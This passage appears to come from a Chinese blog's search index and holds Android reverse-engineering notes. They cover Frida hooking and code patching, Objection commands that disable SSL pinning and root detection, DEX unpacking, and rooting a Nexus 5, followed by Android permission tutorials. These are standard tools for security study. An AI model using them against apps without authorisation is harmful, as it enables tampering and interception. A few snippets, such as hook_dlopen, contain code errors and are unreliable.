[&#x27;int64&#x27;, &#x27;int64&#x27;, &#x27;int&#x27;, &#x27;int&#x27;]) ) //调用 hook 后的函数查看效果 var result = addFunction(0, 0, 1, 2); console.log(&quot;result: &quot;, result);&#125;function hookAdd()&#123; var addAddr = Module.findExportByName(&#x27;libleidian.so&#x27;, &#x27;Java_com_example_leidian_MainActivity_add&#x27;); replaceHook(addAddr);&#125;setImmediate(hookAdd) hook 修改函数的参数和返回值修改数值123456789Interceptor.attach(helloAddr, &#123; onEnter: function (args) &#123; args[2] = ptr(1000) // 指针类型参数 和 整数类型参数 修改 &#125;, onLeave: function (retval) &#123; retval.replace(1337) // 整数类型返回值替换 retval.replace(ptr(&quot;0x1234&quot;))//指针类型返回值替换 （指针其实仍然是数值） &#125;,&#125;) 利用 so 层原有字符串进行地址替换1234567891011121314Interceptor.attach(funcAddr, &#123; onEnter: function (args) &#123; const strAddr = baseAddr.add(0x142D7) // 字符串的文件偏移量 0x142D7 args[1] = strAddr // 替换字符串地址参数 const str = strAddr.readCString() console.log(&quot;target string: &quot;, str); args[2] = ptr(str.length) // 替换字符串长度参数 console.log(&quot;target string length: &quot;, args[2]); &#125;, onLeave: function (retval) &#123; &#125;,&#125;) 创建新字符串并进行地址替换1234567891011121314const newStr = &quot;some strings&quot;;const newStrAddr = Memory.allocUtf8String(newStr); // 使用 Frida 的 Memory 来申请内存区域 返回的是一个指针Interceptor.attach(funcAddr, &#123; onEnter: function (args) &#123; // const newStrAddr = Memory.allocUtf8String(newStr); // 如果在这里申请的话, 到 onLeave 将会回收 可以在全局定义或使用 this.newStrAddr 附加到自身 args[1] = newStrAddr console.log(&quot;target string: &quot;, args[1].readCString()) args[2] = ptr(newStr.length) console.log(&quot;target string length: &quot;, args[2]); &#125;, onLeave: function (retval) &#123;&#125;,&#125;) 原地址上修改字符123456789101112Interceptor.attach(funcAddr, &#123; onEnter: function (args) &#123; let newStr = &#x27;some strings&#x27; // 需要写入字节数组的方式来写入字符串 args[1].writeByteArray(hexToBytes(stringToHex(newStr) + &#x27;00&#x27;)) // c 语言字符串结尾为 0 字节 console.log(&quot;target string: &quot;, args[1].readCString()) args[2] = ptr(newStr.length) console.log(&quot;target string length: &quot;, args[2]); &#125;, onLeave: function (retval) &#123;&#125;,&#125;) 内存读写https://frida.re/docs/javascript-api/#memory 1234567891011121314151617181920// 1. 读取指定地址的字符串const baseAddr = Module.findBaseAddress(&#x27;libleidian.so&#x27;)console.log(baseAddr.add(0x1234).readCString())// 2. dump 指定地址的内存console.log(hexdump(baseAddr.add(0x1234)))// 3. 读指定地址的内存console.log(baseAddr.add(0x1234).readByteArray(16))console.log(Memory.readByteArray(baseAddr.add(0x2c00), 16)) //原先的 API// 4. 写指定地址的内存baseAddr.add(0x1234).writeByteArray(stringToBytes(&#x27;xiaojianbang&#x27;))// 5. 申请新内存写入Memory.alloc()Memory.allocUtf8String()// 6. 修改内存权限Memory.protect(ptr(libso.base), libso.size, &#x27;rwx&#x27;) 修改 native 层代码需注意架构区别！！！arm 架构使用 Arm64Writer 修改，x64、x86 架构使用 X86Writer 修改。 123456789101112131415161718192021222324252627function hexToBytes(hex) &#123; let bytes = []; for (let i = 0; i &lt; hex.length; i += 2) &#123; bytes.push(parseInt(hex.substr(i, 2), 16)); &#125; return bytes;&#125;function alterCode()&#123; const addFuncAddr = Module.findExportByName(&quot;libleidian.so&quot;, &quot;Java_com_example_leidian_MainActivity_add&quot;) const addInsAddr = addFuncAddr.add(0x15) console.log(&quot;origin instruction =&gt; &quot;, Instruction.parse(addInsAddr));//将对应地址的硬编码解析成汇编指令 // console.log(Process.arch); // 修改内存保护为可写 // Memory.protect(addInsAddr, 0x1000, &#x27;rwx&#x27;); //修改对应地址的硬编码 // addInsAddr.writeByteArray(hexToBytes(0x8B45EC))//无效 Memory.patchCode(addInsAddr, 1, function (code) &#123; // let Writer = new Arm64Writer(code, &#123;pc: addInsAddr&#125;); let Writer = new X86Writer(code, &#123;pc: addInsAddr&#125;); Writer.putBytes(hexToBytes(&quot;2b&quot;)); Writer.flush(); &#125;); console.log(&quot;current instruction =&gt; &quot;, Instruction.parse(addInsAddr));//将对应地址的硬编码解析成汇编指令&#125; 函数堆栈打印123456console.log( Thread.backtrace(this.context, Backtracer.ACCURATE) .map(DebugSymbol.fromAddress) //.map(symbol =&gt; `$&#123;symbol.name&#125; ($&#123;symbol.address&#125;)`) .join(&#x27;\\n&#x27;)) 寻找 native 函数所在的动态库native 函数根据注册时机可分为静态注册函数、动态注册函数，它们对应的 hook 点不同。 动态注册函数：动态注册函数 hook RegisterNatives 函数。 静态注册函数：可以 hook dlsym 函数（在动态加载的场景下）。 动态注册函数12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849function hook_RegisterNatives() &#123; let RegisterNatives_addr = null let symbols = Process.findModuleByName(&#x27;libart.so&#x27;).enumerateSymbols() for (let i = 0; i &lt; symbols.length; i++) &#123; let symbol = symbols[i].name if (symbol.indexOf(&#x27;CheckJNI&#x27;) == -1 &amp;&amp; symbol.indexOf(&#x27;JNI&#x27;) &gt;= 0) &#123;//适合所有的 Android 系统版本 if (symbol.indexOf(&#x27;RegisterNatives&#x27;) &gt;= 0) &#123; RegisterNatives_addr = symbols[i].address console.log(&#x27;RegisterNatives_addr: &#x27;, RegisterNatives_addr) &#125; &#125; &#125; Interceptor.attach(RegisterNatives_addr, &#123; onEnter: function (args) &#123; let env = args[0] let jclass = args[1] let class_name = Java.vm.tryGetEnv().getClassName(jclass) let methods_ptr = ptr(args[2]) let method_count = args[3].toInt32() console.log(&#x27;RegisterNatives method counts: &#x27;, method_count) /* JNINativeMethod jmethods [] = &#123; &#123;&quot;DynamicRegistration&quot;, &quot;()V&quot;, (void *)(DynamicRegistrationNative)&#125;//DynamicRegistrationNative 为 native 方法 &#125;; */ for (let i = 0; i &lt; method_count; i++) &#123; let name = methods_ptr.add(i * Process.pointerSize * 3) .readPointer() .readCString() let sig = methods_ptr.add(i * Process.pointerSize * 3 + Process.pointerSize) .readPointer() .readCString() let fnPtr_ptr = methods_ptr.add(i * Process.pointerSize * 3 + Process.pointerSize * 2) .readPointer() let find_module = Process.findModuleByAddress(fnPtr_ptr) console.log( &#x27;RegisterNatives java_class: &#x27;, class_name, &#x27;name: &#x27;, name, &#x27;sig: &#x27;, sig, &#x27;fnPtr: &#x27;, fnPtr_ptr, &#x27;module_name: &#x27;, find_module.name, &#x27;module_base: &#x27;, find_module.base, &#x27;offset: &#x27;, ptr(fnPtr_ptr).sub(find_module.base), ) &#125; &#125;, onLeave: function (retval) &#123;&#125;, &#125;)&#125; 静态注册函数123456789101112131415161718192021function hook_dlsym(dlsymFuncAddr)&#123; Interceptor.attach(dlsymFuncAddr, &#123; onEnter: function (args) &#123; // do something this.libAddr = ptr(args[0]) // args [0] 是库基址 this.funcName = ptr(args[1]) // args [1] 是函数名 &#125;, onLeave: function (retval) &#123; // do something let module = Process.findModuleByAddress(retval)//this.libAddr console.log(&quot;function name: &quot;, this.funcName.readCString(), &quot;lib name: &quot;, module.name, //是否可以直接用 libAddr.name? &quot;function&#x27;s memory address: &quot;retval, &quot;function offset: &quot;, retval.sub(module.base) ) &#125;, &#125;)&#125;let dlsymFuncAddr = Module.findExportByName(&#x27;libdl.so&#x27;, &#x27;dlsym&#x27;)hook_dlsym(dlsymFuncAddr) hook 运行时动态加载的库与函数 dlopen 函数用于运行时动态加载一个共享库，并返回一个句柄。这个句柄可以用于后续的符号解析。 dlsym 函数用于获取运行时动态加载的库中符号的地址。该符号可以是函数、变量等。 hook dlopen 函数123456789101112131415161718192021222324252627282930313233343536//hook_dlopenfunction hook_dlopen(dlopenFuncAdrr, libName, targetFuncOffset, callback) &#123; Interceptor.attach(addr, &#123; onEnter: function (args) &#123; let libPath = args[0].readCString() // 是否是目标动态库 if (libPath.indexOf(libName) != -1) &#123; this.hook = true &#125; &#125;, onLeave: function (retval) &#123; //得对应的 lib 库加载完了才能 hook 目标函数 if (this.hook)&#123; //dlopen 返回值即 lib 库的指针 callback(retval.add(targetFuncOffset)) &#125; &#125; &#125;)&#125;function hook_targetFunc(targetFuncAddr) &#123; Interceptor.attach(targetFuncAddr, &#123; onEnter: function (args) &#123; // do something &#125;, onLeave: function (retval) &#123; // do something &#125;, &#125;)&#125;let dlopenFuncAdrr = Module.findExportByName(&#x27;libdl.so&#x27;, &#x27;dlopen&#x27;) // 低版本安卓系统hook_dlopen(dlopenFuncAdrr, &#x27;libxiaojianbang.so&#x27;, hook_targetFunc)//let dlopenFuncAdrr = Module.findExportByName(&#x27;libdl.so&#x27;, &#x27;android_dlopen_ext&#x27;) // 高版本安卓系统//hook_dlopen(dlopenFuncAdrr, &#x27;libxiaojianbang.so&#x27;, hook_targetFunc) hook dlsym 函数获取目标函数所在的 so 库 123456789101112131415161718192021function hook_dlsym(dlsymFuncAddr)&#123; Interceptor.attach(dlsymFuncAddr, &#123; onEnter: function (args) &#123; // do something this.libAddr = ptr(args[0]) // args [0] 是库基址 this.funcName = ptr(args[1]) // args [1] 是函数名 &#125;, onLeave: function (retval) &#123; // do something let module = Process.findModuleByAddress(retval)//this.libAddr console.log(&quot;function name: &quot;, this.funcName.readCString(), &quot;lib name: &quot;, module.name, //是否可以直接用 libAddr.name? &quot;function&#x27;s memory address: &quot;retval, &quot;function offset: &quot;, retval.sub(module.base) ) &#125;, &#125;)&#125;let dlsymFuncAddr = Module.findExportByName(&#x27;libdl.so&#x27;, &#x27;dlsym&#x27;)hook_dlsym(dlsymFuncAddr) inlineHook（针对寄存器的值）123456789101112131415161718//查看任意地址处的寄存器值function inlineHook() &#123; var nativePointer = Module.findBaseAddress(&#x27;libleidian.so&#x27;) var hookAddr = nativePointer.add(0x2080C) Interceptor.attach(hookAddr, &#123; onEnter: function (args) &#123; console.log(&#x27;onEnter: &#x27;, JSON.stringify(this.context)) // console.log(&#x27;rax: &#x27;, this.context.rax) &#125;, onLeave: function (retval) &#123;&#125;, &#125;) var funcAddr = Module.findExportByName(&#x27;libleidian.so&#x27;, &#x27;Java_com_example_leidian_MainActivity_stringFromJNI&#x27;); var func = new NativeFunction(funcAddr, &quot;int64&quot;, [&quot;pointer&quot;]) //主动调用该函数，以查看效果 func(Java.vm.tryGetEnv())&#125; 相关工具 trace_natives：hook so 库的所有函数，从而实现函数调用跟踪，项目地址 https://github.com/Pr0214/trace_natives jnitrace：hook JNI 的所有函数，项目地址 https://github.com/chame1eon/jnitrace 其他Android 逆向学习笔记——使用 Python 库调用 Frida | Whitebird’s Home (whitebird0.github.io) 实用 FRIDA 进阶：内存漫游、hook anywhere、抓包-安全客 - 安全资讯平台 (anquanke.com) 一些工具&#x2F;脚本 dqzg12300&#x2F;fridaUiTools: frida 工具的缝合怪 (github.com) siyujie&#x2F;OkHttpLogger-Frida: Frida 实现拦截 okhttp 的脚本 (github.com) frida-dexdump 环境：venv 搭建不同版本的 frida 环境 - 冻 L1 的博客 (wutongliran.top) IDA&amp;Frida 学习 - 吾爱破解 - 52pojie.cn","categories":[],"tags":[{"name":"andriod","slug":"andriod","permalink":"http://example.com/tags/andriod/"}],"keywords":[]},{"title":"Objection","slug":"Objection","date":"2024-09-25T09:20:36.000Z","updated":"2024-11-11T09:25:24.851Z","comments":true,"path":"2024/09/25/Objection/","link":"","permalink":"http://example.com/2024/09/25/Objection/","excerpt":"","text":"Objectionobjection 是一个运行时移动探索工具包，观察类方法，报告执行情况，由 Frida 提供支持。支持 iOS 和 Android。 注意与 frida 版本匹配问题 [分享]objection 基本操作与实战-Android 安全-看雪-安全社区|安全招聘|kanxue.com 实用 FRIDA 进阶：内存漫游、hook anywhere、抓包-安全客 - 安全资讯平台 (anquanke.com) adb shell dumpsys window | grep CurrentFocus 查看包名和类 env 1234567891011121314151617181920212223242526272829303132333435objection --help(help命令)Checking for a newer version of objection...Usage: objection [OPTIONS] COMMAND [ARGS]... _ _ _ _ ___| |_|_|___ ___| |_|_|___ ___ | . | . | | -_| _| _| | . | | |___|___| |___|___|_| |_|___|_|_| |___|(object)inject(ion) Runtime Mobile Exploration by: @leonjza from @sensepost 默认情况下，通信将通过USB进行，除非提供了`--network`选项。 选项: -N, --network 使用网络连接而不是USB连接。 -h, --host TEXT [默认: 127.0.0.1] -p, --port INTEGER [默认: 27042] -ah, --api-host TEXT [默认: 127.0.0.1] -ap, --api-port INTEGER [默认: 8888] -g, --gadget TEXT 要连接的Frida Gadget/进程的名称。 [默认: Gadget] -S, --serial TEXT 要连接的设备序列号。 -d, --debug 启用带有详细输出的调试模式。(在堆栈跟踪中包括代理源图) --help 显示此消息并退出。 命令: api 以无头模式启动objection API服务器。 device-type 获取关于已连接设备的信息。 explore 启动objection探索REPL。 patchapk 使用frida-gadget.so补丁一个APK。 patchipa 使用FridaGadget dylib补丁一个IPA。 run 运行单个objection命令。 signapk 使用objection密钥对APK进行Zipalign和签名。 version 打印当前版本并退出。 启动1.手机端或者模拟器开启对应版本的 frida-server 2.获取包名，方式有很多种，我喜欢用以下方式，不仅可以看到包名，而且还能看到当前界面的 class, 实现了初步的快速定位 1234adb shell dumpsys window | grep CurrentFocus # 结果：mCurrentFocus=Window&#123;c46d96e u0 com.example.androiddemo/com.example.androiddemo.Activity.LoginActivity&#125; 3.打开方式有两种，分别是包名和指定 ip 和端口的连接。包名应该是使用率比较高的。（都是 attach 模式） 12345678# 包名objection -g com.example.androiddemo explore # 端口## frida 的开启模式./fs1280am64 -l 0.0.0.0:12306## 指定ip和端口连接objection -N -h 192.168.31.166 -p 5555 -g com.example.androiddemo explore 4.spawn 模式启动。–startup-command “hook 的代码段” 1objection -g com.example.androiddemo explore --startup-command &quot;android hooking watch class com.example.androiddemo.Activity.LoginActivity --dump-args --dump-backtrace --dump-return&quot; 0x04 基本用法Memory 指令，提取内存信息1234memory list modules // 查看内存中加载的库memory list exports libssl.so // 查看库的导出函数memory list exports libart.so --json /root/libart.json //将结果保存到json文件中memory search --string --offsets-only //搜索内存 任务管理12345# 查看任务列表jobs list # 关闭任务jobs kill jobid root 指令12android root disable //尝试关闭app的root检测android root simulate //尝试模拟root环境 关闭 ssl 效验1android sslpinning disable heap 内存堆搜索与执行123456789# 堆内存中搜索指定类的实例, 可以获取该类的实例idandroid heap search instances com.example.androiddemo.Activity.LoginActivity# 返回：Class instance enumeration complete for com.example.androiddemo.Activity.LoginActivityHandle Class toString()------ ---------------------------------------------- ------------------------------0x1fba com.example.androiddemo.Activity.LoginActivity com.example.androiddemo.Activity.LoginActivity@d8a5160# 执行实例方法android heap execute 0x1fba a 强制启动 activity1android intent launch_activity com.example.androiddemo.Activity.FridaActivity1 hook 内存漫游1234567891011121314# 枚举activityandroid hooking list activities# 列出内存中所有的类android hooking list classes# 列出类的所有方法android hooking list class_methods 包名.类名# 在内存中所有已加载的类中搜索包含特定关键词的类android hooking search classes 包名包含的关键词# hook类的所有方法android hooking watch class 包名.类名# hook 类的方法，默认会Hook方法的所有重载android hooking watch class_method 包名.类名.方法# 如果只需hook其中一个重载函数 指定参数类型 多个参数用逗号分隔android hooking watch class_method 包名.类名.方法 &quot;参数1,参数2&quot; 查看类的方法1android hooking list class_methods 类名 日志12345# objection日志文件位置~/.objection/objection.log # 命令历史文件位置~/.objection/objection_history （免)root 动态调试 apkobjection 的 patchapk 需要 aapt(打包工具、adb、jarsigner（签名工具、apktool（解包， apksigner 其中 apktool 需要官网下载下，其他前仨在 android-studio 中就有： ln -s &#x2F;root&#x2F;Android&#x2F;Sdk&#x2F;build-tools&#x2F;34.0.0&#x2F;zipalign &#x2F;usr&#x2F;bin ln -s &#x2F;root&#x2F;Desktop&#x2F;android-studio&#x2F;jbr&#x2F;bin&#x2F;jarsigner &#x2F;usr&#x2F;bin ln -s &#x2F;root&#x2F;Android&#x2F;Sdk&#x2F;build-tools&#x2F;34.0.0&#x2F;aapt &#x2F;usr&#x2F;bin ln -s &#x2F;root&#x2F;Android&#x2F;Sdk&#x2F;build-tools&#x2F;34.0.0&#x2F;aapt2 &#x2F;usr&#x2F;bin ln -s &#x2F;root&#x2F;Android&#x2F;Sdk&#x2F;platform-tools&#x2F;adb &#x2F;usr&#x2F;bin ln -s &#x2F;root&#x2F;Android&#x2F;Sdk&#x2F;build-tools&#x2F;34.0.0&#x2F;apksigner &#x2F;usr&#x2F;bin 然后就是解压 apk 看下它里面的 lib 是哪个架构的，按架构来运行： 12345678910111213141516171819202122232425262728293031323334353637Usage: objection patchapk [OPTIONS] Patch an APK with the frida-gadget.so.Options: -s, --source TEXT The source APK to patch [required] -a, --architecture TEXT The architecture of the device the patched APK will run on. This can be determined with `adb shell getprop ro.product.cpu.abi`. If it is not specified, this command will try and determine it automatically. -V, --gadget-version TEXT The gadget version to use. If not specified, the latest version will be used. -p, --pause Pause the patcher before rebuilding the APK. -k, --skip-cleanup Do not clean temporary files once finished. -d, --enable-debug Set the android:debuggable flag to true in the application manifest. -N, --network-security-config Include a network_security_config.xml file allowing for user added CA&#x27;s to be trusted on Android 7 and up. This option can not be used with the --skip-resources flag. -D, --skip-resources Skip resource decoding as part of the apktool processing. -t, --target-class TEXT The target class to patch. -2, --use-aapt2 Use the aapt2 binary instead of aapt as part of the apktool processing. -c, --gadget-config TEXT The gadget configuration file to use. Refer to https://frida.re/docs/gadget/ for more information. -l, --script-source TEXT A script file to use with the the &quot;path&quot; config type. Specify &quot;libfrida- gadget.script.so&quot; as the &quot;path&quot; in your config. -n, --ignore-nativelibs Do not change the extractNativeLibs flag in the AndroidManifest.xml. -m, --manifest TEXT A decoded AndroidManifest.xml file to read. objection patchapk –architecture armeabi-v7a –use-aapt2 –source yourAPK.apk app 启动后用 objection&#x2F;frida 直接连上即可。 proxychains, 科学 adb: failed to install fulao2.objection.apk: Failure [INSTALL_FAILED_UPDATE_INCOMPATIBLE: Package com.ilulutv.fulao2 signatures do not match the previously installed version; ignoring!] 解决：删除原先已经安装的 app objection explore 内存漫游和组件控制12345678910111213android hooking ``list` `activities# 列出内存中所有的类android hooking ``list` `classes# 列出类的所有方法android hooking ``list` `class_methods 包名.类名# 在内存中所有已加载的类中搜索包含特定关键词的类android hooking search classes 包名包含的关键词# hook类的所有方法android hooking watch ``class` `包名.类名# hook 类的方法，默认会Hook方法的所有重载android hooking watch class_method 包名.类名.方法# 如果只需hook其中一个重载函数 指定参数类型 多个参数用逗号分隔android hooking watch class_method 包名.类名.方法 ``&quot;参数1,参数2&quot; 类和方法动态 traceobjection+DEXDump 内存暴力脱壳机加载插件 1objection -g com.hello.qqc explore -P ~/.objection/plugins 1plugin dexdump dump grep -ril ’XXX‘ 找包含 XXX 的文件 例如 grep -ril “Mainactivity” 返回值：1[DEXDump]: DexSize``=``0x1d1f50``, DexMd5``=``7ed584af40ef0b1bc211688395e92c98``,SavePath``=``/``root``/``.objection``/``plugins``/``com.example.androidemo``/``0x7e38c0201c``.dex objection RPC 可以直接 curl 的 RPChttps://github.com/sensepost/objection/blob/master/agent/src/rpc/android.ts wallbreakerobjection 启动 frida-server，使用 -P 参数带着插件启动 objection: objection -g com.app.name explore -P ~/.objection/plugins 然后就可以愉快的使用 wallbreaker 的几个命令了: 搜索类 1plugin wallbreaker classsearch &lt;pattern&gt; 根据给的 pattern 对所有类名进行匹配，列出匹配到的所有类名。 搜索对象 1plugin wallbreaker objectsearch &lt;classname&gt; 根据类名搜索内存中已经被创建的实例，列出 handle 和 toString() 的结果。 ClassDump 1plugin wallbreaker classdump &lt;classname&gt; [--fullname] 输出类的结构， 若加了 --fullname 参数，打印的数据中类名会带着完整的包名。 ObjectDump 1plugin wallbreaker objectdump &lt;handle&gt; [--fullname] 在 ClassDump 的基础上，输出指定对象中的每个字段的数据。 12345678910111213141516搜索类plugin wallbreaker objectsearch LoginActivity//返回：com.example.androiddemo.Activity.LoginActivitycom.example.androiddemo.Activity.LoginActivity$1 # 根据类名搜索内存中已经被创建的实例，列出 handle 和 toString() 的结果 --fullname 打印完整的包名plugin wallbreaker classdump com.example.androiddemo.Activity.LoginActivity --fullname # 搜索对象plugin wallbreaker objectsearch com.example.androiddemo.Activity.LoginActivity//返回：[0x2262]: com.example.androiddemo.Activity.LoginActivity@d8a5160 # 查看对象的一些属性和方法plugin wallbreaker objectdump 0x2262 --fullname","categories":[],"tags":[],"keywords":[]},{"title":"第一次刷机记录","slug":"第一次刷机记录","date":"2024-09-21T10:51:13.000Z","updated":"2024-11-11T09:23:52.126Z","comments":true,"path":"2024/09/21/第一次刷机记录/","link":"","permalink":"http://example.com/2024/09/21/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95/","excerpt":"","text":"1 准备真机：Nexus 5 刷入：bullhead 8.1.0 (2017) 软件：magisk wifiadb 2 步骤 magisk 方法刷系统手机关机，按住下与关机键进入 fastboot 模式 1tar -xzvf bullhead-opm1.171019.011-factory-3be6fd1c.zip 1./flash-base.sh 故障 1fastboot too old 版本太新 将老版本置于新版本同目录下 首先使用 which fastboot 命令进行 fastboot 执行命令文件的位置查找 找个 fastboot 老版本文件，改成同名字，拉进去进行替换一下，把原来的 fastboot 拉出去 然后执行 sudo chmod 777 接着点击十下版本号进入开发者模式，打开 usb 调试，调整息屏时间 rootDownload TWRP for bullhead Team Win Recovery Project twrp-3.3.1-0-bullhead.img fastboot 模式 fastboot flash recovery twrp-3.3.1-0-bullhead.img magisk 20.04 1adb push Magisk-v20.4.zip /sdcard/ 打开 magisk 的赋予 shell 超级用户权限 frida-sever adb push frida-server-16.5.2-android-arm64 &#x2F;data&#x2F;local&#x2F;tmp&#x2F; 3 步骤 supersu 方法步骤先刷系统+twrp adb push SR5-SuperSU-v2.82-SR5-20171001224502.zip &#x2F;sdcard&#x2F; 最新的 nethunter 报错 zip file is corrupt 换 2020.3（注意将 http 源改成 https） 有 dpkg erro1 的错误就 先 apt –fix-broken install 再使用-f 安装 （虽然继续报错，但是安装是成功的） 故障 2 jnettop 找不到包解决： wget http://ftp.us.debian.org/debian/pool/main/j/jnettop/jnettop_0.13.0-1.2_arm64.deb 找到相应系统的包 dpkg -i jnettop_0.13.0-1.2_arm64.deb jnettop 终端太小： stty rows 25 columns 80 修改终端大小。 注：0-9 键换网卡 q 退出 配置nethunter app 进行 ssh 连接 点击 kex manger 点 setup**设置密码（12345678）点 start sever 进入 nethunter kex 输入密码点击 connect 进入 kali 主机 ssh root@刚刚创建的 kali 的 ip 地址 密码为 toor 参考：《来自高纬的对抗：替换安卓内核并解封 Linux 命令和环境》 (qq.com)","categories":[],"tags":[],"keywords":[]},{"title":"Andriod-development-ContentProvider","slug":"Andriod-development-ContentProvider","date":"2024-09-21T08:17:41.000Z","updated":"2024-11-11T09:24:58.299Z","comments":true,"path":"2024/09/21/Andriod-development-ContentProvider/","link":"","permalink":"http://example.com/2024/09/21/Andriod-development-ContentProvider/","excerpt":"","text":"跨程序共享数据——探究内容提供器什么是 ContentProvider内容提供器(Content Provider)是 Android 四大组件之一，主要用于在不同的应用程序之间实现数据共享的功能，它提供了一套完整的机制，允许一个程序访问另一个程序中的数据，同时还能保证被访数据的安全性。使用时需要在 AndroidManifest..xml 文件中进行声明。 不同于文件存储和 SharedPreferences 存储中的两种全局可读写操作模式，内容提供器可以选择只对哪一部分数据进行共享，从而保证我们程序中的隐私数据不会有泄漏的风险。 运行时权限Android 权限机制详解例如之前，为了要访问系统的网络状态以及监听开机广播，于是在 AndroidManifest..xml 文件中添加了这样两句权限声明： 1234567&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;com.example.broadcasttest&quot;&gt; &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt; &lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot; /&gt; ...&lt;/manifest&gt; 因为访问系统的网络状态以及监听开机广播涉及了用户设备的安全性，因此必须在 AndroidManifest.xml 中加入权限声明，否则我们的程序就会崩溃。 那么现在问题来了，加入了这两句权限声明后，对于用户来说到底有什么影响呢？为什么这样就可以保护用户设备的安全性了呢？其实用户主要在以下两个方面得到了保护，一方面，用户在安装程序的时候会在安装界面显示应用所需要的权限；另一方面，用户可以随时在应用程序管理界面查看任意一个程序的权限申请情况，以保证应用程序不会出现各种滥用权限的情况。 然而大多数应用存在滥用权限的情况，不管到底用不用得到，反正先把权限申请了再说。Android 开发团队当然也意识到了这个问题，于是在 6.0 系统中加入了运行时权限功能。也就是说，用户不需要在安装软件的时候一次性授权所有申请的权限，而是可以在软件的使用过程中再对某一项权限申请进行授权。比如说一款相机应用在运行时申请了地理位置定位权限，就算我拒绝了这个权限，但是我应该仍然可以使用这个应用的其他功能，而不是像之前那样直接无法安装它。 当然，并不是所有权限都需要在运行时申请，对于用户来说，不停地授权也很烦琐。Android 现在将所有的权限归成了两类，一类是普通权限，一类是危险权限。普通权限指的是那些不会直接威胁到用户的安全和隐私的权限，对于这部分权限申请，系统会自动帮我们进行授权，而不需要用户再去手动操作了，比如在 BroadcastTest 项目中申请的两个权限就是普通权限。危险权限则表示那些可能会触及用户隐私，或者对设备安全性造成影响的权限，如获取设备联系人信息、定位设备的地理位置等，对于这部分权限申请，必须要由用户手动点击授权才可以，否则程序就无法使用相应的功能。 但是 Android 中有一共有上百种权限，我们怎么从中区分哪些是普通权限，哪些是危险权限呢？其实并没有那么难，因为危险权限总共就那么几个，除了危险权限之外，剩余的就都是普通权限了。下表列出了 Android 中所有的危险权限，一共是 9 组 24 个权限。 权限组名 权限名 CALENDAR READ_CALENDAR WRITE_CALENDAR CAMERA CAMERA CONTACTS READ_CONTACTS WRITE_CONTACTS GET_ACCOUNTS LOCATION ACCESS_FINE_LOCATION ACCESS_COARSE_LOCATION MICROPHONE RECORD_AUDIO PHONE READ_PHONE_STATE CALL_PHONE READ_CALL_LOG WRITE_CALL_LOG ADD_VOICEMAIL USE_SIP PROCESS_OUTGOING_CALLS SENSORS BODY_SENSORS SMS SEND_SMS RECEIVE_SMS READ_SMS RECEIVE_WAP_PUSH RECEIVE_MMS STORAGE READ_EXTERNAL_STORAGE WRITE_EXTERNAL_STORAGE 我们并不需要记住这些权限，只要把它当成一个参照表来查阅就行了。每当要使用一个权限时，可以先到这张表中来查一下，如果是属于这张表中的权限，那么就需要进行运行时权限处理，如果不在这张表中，那么只需要在 AndroidManifest.xml 文件中添加一下权限声明就可以了。另外注意一下，表格中每个危险权限都属于一个权限组，我们在进行运行时权限处理时使用的是权限名，但是用户一旦同意授权了，那么该权限所对应的权限组中所有的其他权限也会同时被授权。 Android 系统中完整的权限列表可以访问 http:&#x2F;developer..android.com&#x2F;reference&#x2F;android&#x2F;.Manifest.permission.html。 在程序运行时申请权限我们通过一个例子来学习运行时权限的使用方法。假设应用在运行时需要申请 CALL_PHONE 这个权限，这里我们就用一个按钮来触发权限申请，所以修改 activity_main.xml 布局文件如下所示： 1234567891011121314151617&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; tools:context=&quot;.MainActivity&quot; android:orientation=&quot;vertical&quot; android:gravity=&quot;center&quot;&gt; &lt;android.widget.Button android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;申请权限&quot; android:onClick=&quot;ClicktoAccess&quot;/&gt;&lt;/LinearLayout&gt; MainActivity 代码 1234567891011121314public class MainActivity extends AppCompatActivity &#123; ...... public void ClicktoAccess(View view) &#123; try &#123; Intent intent = new Intent(Intent.ACTION_CALL); intent.setData(Uri.parse(&quot;tel:10086&quot;)); startActivity(intent); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; ClicktoAccess() 方法为按钮的点击方法，在该方法中，我们构建了一个隐式 Intent，Intent 的 action 指定为 Intent.ACTION_CALL，这是一个系统内置的打电话的动作，data 部分指定了协议是 tel，号码是 10086。另外为了防止程序崩溃，我们将所有操作都放在了异常捕获代码块当中。 Intent.ACTION_CALL 与 Intent.ACTION_DIAL 不同，Intent.ACTION_DIAL 表示打开拨号界面，这个是不需要声明权限的，而 Intent.ACTION_CALL 则可以直接拨打电话，因此必须声明权限。 在 AndroidManifest.xml 文件中声明该权限： 123456789&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot;&gt; &lt;uses-permission android:name=&quot;android.permission.CALL_PHONE&quot;/&gt; &lt;application ... &lt;/application&gt;&lt;/manifest&gt; 这样我们就将拨打电话的功能成功实现了，并且在低于 Android6.0 系统的手机上都是可以正常运行的，但是如果我们在 6.0 或者更高版本系统的手机上运行，点击 Make Call 按钮就没有任何效果，这时观察 logcat 中的打印日志，你会看到如下警告信息。 1java.lang.SecurityException: Permission Denial: starting Intent &#123; act=android.intent.action.CALL... 警告信息中提醒我们 Permission Denial，很明显，是由于权限被禁止所导致的，因为 6.0 及以上系统在使用危险权限时都必须进行运行时权限处理。 修改 MainActivity 中的代码，如下所示： 1234567891011121314151617181920212223242526272829303132333435363738394041424344public class MainActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); &#125; public void ClicktoAccess(View view) &#123; if (ContextCompat.checkSelfPermission(MainActivity.this, android.Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED)&#123; ActivityCompat.requestPermissions(MainActivity.this,new String[]&#123;android.Manifest.permission.CALL_PHONE&#125;,1); &#125; else &#123; 